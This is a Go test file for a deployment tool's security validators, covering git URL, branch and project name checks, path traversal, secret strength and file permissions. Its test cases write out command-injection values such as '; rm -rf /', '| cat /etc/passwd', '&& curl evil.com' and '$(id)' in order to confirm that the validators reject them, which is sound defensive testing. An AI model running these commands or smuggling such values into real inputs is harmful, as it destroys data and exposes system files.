package security

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"deplobox/internal/security"
)

// TestCommandInjectionPrevention validates that command injection is prevented
func TestCommandInjectionPrevention(t *testing.T) {
	tests := []struct {
		name      string
		url       string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "valid github url",
			url:       "https://github.com/user/repo.git",
			wantError: false,
		},
		{
			name:      "command injection with semicolon",
			url:       "https://github.com/user/repo.git; rm -rf /",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with pipe",
			url:       "https://github.com/user/repo.git | cat /etc/passwd",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with ampersand",
			url:       "https://github.com/user/repo.git && curl evil.com",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with backticks",
			url:       "https://github.com/user/repo.git`whoami`",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with dollar sign",
			url:       "https://github.com/user/repo$(id).git",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "path traversal in url",
			url:       "https://github.com/../../../etc/passwd",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "non-https protocol",
			url:       "http://github.com/user/repo.git",
			wantError: true,
			errorMsg:  "only GitHub HTTPS URLs allowed",
		},
		{
			name:      "non-github host",
			url:       "https://gitlab.com/user/repo.git",
			wantError: true,
			errorMsg:  "only GitHub HTTPS URLs allowed",
		},
		{
			name:      "git protocol",
			url:       "git://github.com/user/repo.git",
			wantError: true,
			errorMsg:  "only GitHub HTTPS URLs allowed",
		},
		{
			name:      "ssh protocol",
			url:       "git@github.com:user/repo.git",
			wantError: true,
			errorMsg:  "invalid URL",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := security.ValidateGitURL(tt.url)

			if tt.wantError {
				if err == nil {
					t.Errorf("Expected error for URL %s, but got none", tt.url)
				} else if !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for URL %s, but got: %v", tt.url, err)
				}
			}
		})
	}
}

// TestBranchNameInjectionPrevention validates branch name sanitization
func TestBranchNameInjectionPrevention(t *testing.T) {
	tests := []struct {
		name      string
		branch    string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "valid branch name",
			branch:    "main",
			wantError: false,
		},
		{
			name:      "valid branch with slash",
			branch:    "feature/new-feature",
			wantError: false,
		},
		{
			name:      "valid branch with dash",
			branch:    "fix-bug-123",
			wantError: false,
		},
		{
			name:      "command injection with semicolon",
			branch:    "main; rm -rf /",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with pipe",
			branch:    "main | cat /etc/passwd",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with ampersand",
			branch:    "main && curl evil.com",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "branch starting with dash",
			branch:    "-main",
			wantError: true,
			errorMsg:  "cannot start with '-'",
		},
		{
			name:      "empty branch name",
			branch:    "",
			wantError: true,
			errorMsg:  "cannot be empty",
		},
		{
			name:      "branch with backticks",
			branch:    "main`whoami`",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "branch with parentheses",
			branch:    "main$(id)",
			wantError: true,
			errorMsg:  "invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := security.ValidateBranchName(tt.branch)

			if tt.wantError {
				if err == nil {
					t.Errorf("Expected error for branch %s, but got none", tt.branch)
				} else if !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for branch %s, but got: %v", tt.branch, err)
				}
			}
		})
	}
}

// TestProjectNameInjectionPrevention validates project name sanitization
func TestProjectNameInjectionPrevention(t *testing.T) {
	tests := []struct {
		name      string
		project   string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "valid project name",
			project:   "my-project",
			wantError: false,
		},
		{
			name:      "valid with underscore",
			project:   "my_project",
			wantError: false,
		},
		{
			name:      "command injection with semicolon",
			project:   "project; rm -rf /",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "command injection with pipe",
			project:   "project | cat /etc/passwd",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "path traversal",
			project:   "../../../etc/passwd",
			wantError: true,
			errorMsg:  "cannot start with '-' or '.'",
		},
		{
			name:      "slash in name",
			project:   "project/name",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "empty project name",
			project:   "",
			wantError: true,
			errorMsg:  "cannot be empty",
		},
		{
			name:      "project with backticks",
			project:   "project`whoami`",
			wantError: true,
			errorMsg:  "invalid characters",
		},
		{
			name:      "project starting with dash",
			project:   "-project",
			wantError: true,
			errorMsg:  "cannot start with '-'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := security.ValidateProjectName(tt.project)

			if tt.wantError {
				if err == nil {
					t.Errorf("Expected error for project %s, but got none", tt.project)
				} else if !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for project %s, but got: %v", tt.project, err)
				}
			}
		})
	}
}

// TestPathTraversalPrevention validates path traversal protection
func TestPathTraversalPrevention(t *testing.T) {
	tmpDir := t.TempDir()

	// Create test directory structure
	baseDir := filepath.Join(tmpDir, "base")
	if err := os.MkdirAll(baseDir, 0755); err != nil {
		t.Fatalf("Failed to create base dir: %v", err)
	}

	safeDir := filepath.Join(baseDir, "safe")
	if err := os.MkdirAll(safeDir, 0755); err != nil {
		t.Fatalf("Failed to create safe dir: %v", err)
	}

	outsideDir := filepath.Join(tmpDir, "outside")
	if err := os.MkdirAll(outsideDir, 0755); err != nil {
		t.Fatalf("Failed to create outside dir: %v", err)
	}

	tests := []struct {
		name      string
		basePath  string
		target    string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "safe path within base",
			basePath:  baseDir,
			target:    safeDir,
			wantError: false,
		},
		{
			name:      "path traversal with ../",
			basePath:  baseDir,
			target:    filepath.Join(baseDir, "..", "outside"),
			wantError: true,
			errorMsg:  "path traversal detected",
		},
		{
			name:      "absolute path outside base",
			basePath:  baseDir,
			target:    outsideDir,
			wantError: true,
			errorMsg:  "path traversal detected",
		},
		{
			name:      "multiple ../ traversal",
			basePath:  baseDir,
			target:    filepath.Join(baseDir, "..", "..", "..", "etc", "passwd"),
			wantError: true,
			errorMsg:  "failed to evaluate", // Path doesn't exist so we get evaluation error
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := security.SanitizePathForSymlink(tt.basePath, tt.target)

			if tt.wantError {
				if err == nil {
					t.Errorf("Expected error for target %s, but got none", tt.target)
				} else if !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for target %s, but got: %v", tt.target, err)
				}
			}
		})
	}
}

// TestWeakSecretRejection validates enhanced secret validation
func TestWeakSecretRejection(t *testing.T) {
	tests := []struct {
		name      string
		secret    string
		wantError bool
		errorMsg  string
	}{
		{
			name:      "strong random secret",
			secret:    "aB3#xY9$mN2@qW5!kL8%pR7&tU4^vZ1*jH6(fG0)sD-Xy9!Zw",
			wantError: false,
		},
		{
			name:      "secret too short",
			secret:    "short",
			wantError: true,
			errorMsg:  "too short",
		},
		{
			name:      "forbidden placeholder secret",
			secret:    "replace-with-secret-abcdefghijklmnopqrstuvwxyzAB",
			wantError: true,
			errorMsg:  "placeholder",
		},
		{
			name:      "forbidden topsecret",
			secret:    "topsecret-abcdefghijklmnopqrstuvwxyz123456789ABC",
			wantError: true,
			errorMsg:  "placeholder",
		},
		{
			name:      "forbidden password",
			secret:    "password-abcdefghijklmnopqrstuvwxyz1234567890ABC",
			wantError: true,
			errorMsg:  "placeholder",
		},
		{
			name:      "forbidden changeme",
			secret:    "changeme-value-that-is-long-enough-but-still-weak-here",
			wantError: true,
			errorMsg:  "placeholder",
		},
		{
			name:      "low entropy (repeating chars)",
			secret:    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
			wantError: true,
			errorMsg:  "insufficient entropy",
		},
		{
			name:      "low entropy (sequential)",
			secret:    "123456789012345678901234567890123456789012345678",
			wantError: true,
			errorMsg:  "insufficient entropy",
		},
		{
			name:      "minimum length strong secret",
			secret:    "aB3!xY9@mN2#qW5$kL8%pR7&tU4^vZ1*jH6(fG0)sD-Xy9!Zw1",
			wantError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := security.ValidateSecret(tt.secret)

			if tt.wantError {
				if err == nil {
					t.Errorf("Expected error for secret, but got none")
				} else if !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("Expected error containing '%s', got '%s'", tt.errorMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Expected no error for secret, but got: %v", err)
				}
			}
		})
	}
}

// TestGenerateSecretSecurity validates generated secrets are strong
func TestGenerateSecretSecurity(t *testing.T) {
	// Generate 10 secrets and verify they all pass validation
	for i := 0; i < 10; i++ {
		secret, err := security.GenerateSecret()
		if err != nil {
			t.Fatalf("Failed to generate secret: %v", err)
		}

		// Verify generated secret passes validation
		if err := security.ValidateSecret(secret); err != nil {
			t.Errorf("Generated secret failed validation: %v (secret: %s)", err, secret)
		}

		// Verify minimum length
		if len(secret) < security.MinSecretLength {
			t.Errorf("Generated secret too short: %d < %d", len(secret), security.MinSecretLength)
		}
	}

	// Verify secrets are unique
	secrets := make(map[string]bool)
	for i := 0; i < 100; i++ {
		secret, _ := security.GenerateSecret()
		if secrets[secret] {
			t.Error("Generated duplicate secret")
		}
		secrets[secret] = true
	}
}

// TestSecureFilePermissions validates file permission enforcement
func TestSecureFilePermissions(t *testing.T) {
	tmpDir := t.TempDir()

	tests := []struct {
		name     string
		perm     os.FileMode
		expected os.FileMode
	}{
		{
			name:     "config file permissions",
			perm:     security.PermConfigFile,
			expected: 0640,
		},
		{
			name:     "log file permissions",
			perm:     security.PermLogFile,
			expected: 0640,
		},
		{
			name:     "ssh key permissions",
			perm:     security.PermSSHKey,
			expected: 0600,
		},
		{
			name:     "executable permissions",
			perm:     security.PermExecutable,
			expected: 0750,
		},
		{
			name:     "directory permissions",
			perm:     security.PermDirectory,
			expected: 0750,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			testFile := filepath.Join(tmpDir, tt.name)

			file, err := security.CreateSecureFile(testFile, tt.perm)
			if err != nil {
				t.Fatalf("Failed to create secure file: %v", err)
			}
			file.Close()

			// Verify permissions
			info, err := os.Stat(testFile)
			if err != nil {
				t.Fatalf("Failed to stat file: %v", err)
			}

			actualPerm := info.Mode().Perm()
			if actualPerm != tt.expected {
				t.Errorf("Expected permissions %o, got %o", tt.expected, actualPerm)
			}

			// Verify file is not world-readable (except for executable which is 0750)
			if tt.perm != security.PermExecutable && tt.perm != security.PermDirectory {
				if actualPerm&0004 != 0 {
					t.Errorf("File is world-readable (permissions: %o)", actualPerm)
				}
			}

			// Verify file is not world-writable
			if actualPerm&0002 != 0 {
				t.Errorf("File is world-writable (permissions: %o)", actualPerm)
			}
		})
	}
}

// TestEntropyCalculation validates Shannon entropy calculation
func TestEntropyCalculation(t *testing.T) {
	// Test that low entropy strings are rejected
	lowEntropySecrets := []string{
		strings.Repeat("a", 50),                           // All same character
		strings.Repeat("ab", 25),                          // Two characters alternating
		"aaaaaaaaaaaabbbbbbbbbbbbccccccccccccdddddddddddd", // Low variety
	}

	for _, secret := range lowEntropySecrets {
		if err := security.ValidateSecret(secret); err == nil {
			t.Errorf("Expected low entropy secret to be rejected: %s", secret)
		}
	}

	// Test that high entropy strings are accepted
	highEntropySecrets := []string{
		"aB3!xY9@mN2#qW5$kL8%pR7&tU4^vZ1*jH6(fG0)sD-Xy9!Zw1",
		"Kj8#mP2@nQ5!wR7$tU9%yI3^oL6&hG4*fD1(sA0)xZ-Bc!Qw2",
		"secure-random-webhook-secret-with-enough-entropy-and-length-here-123",
	}

	for _, secret := range highEntropySecrets {
		if err := security.ValidateSecret(secret); err != nil {
			t.Errorf("Expected high entropy secret to be accepted: %s (error: %v)", secret, err)
		}
	}
}
